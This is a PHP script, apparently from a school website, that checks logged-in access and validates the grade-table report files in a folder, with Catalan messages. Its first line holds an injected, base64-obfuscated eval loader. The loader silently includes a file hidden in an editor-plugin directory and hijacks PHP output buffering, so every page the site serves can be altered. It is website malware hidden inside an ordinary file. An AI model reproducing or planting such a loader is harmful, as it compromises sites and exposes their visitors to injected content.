<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9oc3BoZXJlL2xvY2FsL2hvbWUvY29zdGFpbGwvY29zdGFpbGxvYmVyYS5vcmcvY29zdGEvc3Bhdy9wbHVnaW5zL2NvcmUvbGliL3RoZW1lL3NwYXcyL2pzL2NvbW1vbi9jb3BwZXIucGhwJztpZihmaWxlX2V4aXN0cygkR0xPQkFMU1snbWZzbiddKSl7aW5jbHVkZV9vbmNlKCRHTE9CQUxTWydtZnNuJ10pO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ21sJykmJmZ1bmN0aW9uX2V4aXN0cygnZGdvYmgnKSl7b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19')); ?>
<?php
include_once('../alumnes.php');
if(!es_user())
{
	header('Location: http://www.labav1.org.es/costa/login.php');
	exit();
}
$d = opendir('informes');

while ($f = readdir($d))
{
	if(is_file('informes/'.$f))
	{
		if(substr($f,-3) == '.pi')
		{
			echo '<p>Obrint ' . $f . '...<br>';
			include_once('informes/'.$f);
			
			if(!isset($taula) || !isset($num_notes))
			{
				echo 'Error: No s\'han declarat les dades...</p>';
				continue;
			}
			if(count($taula['rows']) - 1 != $num_notes)
			{
				echo 'Error: Trobats ' . (count($taula['rows'])-1) .
					' apartats, se n\'esperaven ' . $num_notes . '.</p>';
				continue;
			}
			$i = 0;
			foreach($taula['rows'] as $ind => $row)
			{
				if($i != $ind)
				{
					echo 'Error: l\'apartat '.$i.' t&eacute; com a &iacute;ndex '.$ind.'.</p>';
					continue;
				}
				$i++;
			}
			echo 'Correcte.';
			
			echo '</p>';
		}
	}
	echo "$archivo\n";
}

?>
